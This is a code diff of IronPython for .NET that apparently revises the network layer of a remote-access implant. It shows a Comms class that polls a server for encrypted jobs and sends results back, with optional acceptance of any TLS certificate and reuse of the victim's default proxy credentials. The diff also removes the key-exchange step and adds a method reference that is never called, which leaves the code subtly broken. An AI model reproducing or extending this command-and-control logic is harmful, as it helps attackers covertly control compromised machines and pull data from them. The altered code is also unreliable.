@@ -1,16 +1,29 @@
 class Response(object):
-    def __init__(self, response):
-        self.response = response
+    def __init__(self, request):
+        self.request = request
 
     @property
     def text(self):
-        return StreamReader(self.response.GetResponseStream()).ReadToEnd()
+        response = self.request.GetResponse()
+        reader = StreamReader(response.GetResponseStream())
+        data = reader.ReadToEnd()
+        reader.Close()
+        response.Close()
+        self.request.Abort()
+        return data
 
     @property
     def bytes(self):
+        data = None
+        response = self.request.GetResponse()
         with MemoryStream() as memstream:
-            self.response.GetResponseStream().CopyTo(memstream)
-            return memstream.ToArray()
+            with response.GetResponseStream() as reader:
+                reader.CopyTo(memstream)
+                data = memstream.ToArray()
+                reader.Close
+        response.Close()
+        self.request.Abort()
+        return data
 
 
 class Requests(object):
@@ -19,9 +32,12 @@ class Requests(object):
         ServicePointManager.SecurityProtocol = ssl_versions
         if not verify:
             ServicePointManager.ServerCertificateValidationCallback = RemoteCertificateValidationCallback(lambda srvPoint, certificate, chain, errors: True)
+        ServicePointManager.Expect100Continue = False
 
     def post(self, url, payload=None):
         r = WebRequest.Create(url)
+        r.ServicePoint.ConnectionLimit = 500
+        r.Timeout = 30000
         r.ContentType = "application/octet-stream"
         r.Method = "POST"
         if self.proxy_aware:
@@ -33,23 +49,25 @@ class Requests(object):
                 data = Encoding.UTF8.GetBytes(payload)
             else:
                 data = payload
-
             r.ContentLength = data.Length
-            requestStream = r.GetRequestStream()
-            requestStream.Write(data, 0, data.Length)
-            requestStream.Close()
+            with r.GetRequestStream() as requestStream:
+                requestStream.Write(data, 0, data.Length)
+                requestStream.Close()
 
-        return Response(r.GetResponse())
+        return Response(r)
+
 
     def get(self, url):
         r = WebRequest.Create(url)
+        r.ServicePoint.ConnectionLimit = 500
+        r.Timeout = 30000
         r.ContentType = "application/octet-stream"
         r.Method = "GET"
         if self.proxy_aware:
             r.Proxy = WebRequest.GetSystemWebProxy()
             r.Proxy.Credentials = CredentialCache.DefaultCredentials
 
-        return Response(r.GetResponse())
+        return Response(r)
 
 class Comms(Serializable):
     def __init__(self, client):
@@ -65,14 +83,11 @@ class Comms(Serializable):
         while True:
             try:
                 self.crypto = Crypto()
-                r = self.requests.post(self.base_url, payload=self.crypto.public_key)
-                self.crypto.derive_key(r.text)
                 return
             except Exception as e:
                 if DEBUG:
                     print "Error performing key exchange: " + str(e)
                     print_traceback()
-
             Thread.Sleep(self.client.SLEEP)
 
     def send_job_results(self, results, job_id):
@@ -105,8 +120,7 @@ class Comms(Serializable):
                 job = self.requests.get(self.jobs_url).bytes
                 if len(job):
                     return JavaScriptSerializer().DeserializeObject(
-                        Encoding.UTF8.GetString(self.crypto.Decrypt(job))
-                    )
+                        Encoding.UTF8.GetString(self.crypto.Decrypt(job)))
                 return
             except Exception as e:
                 if DEBUG:
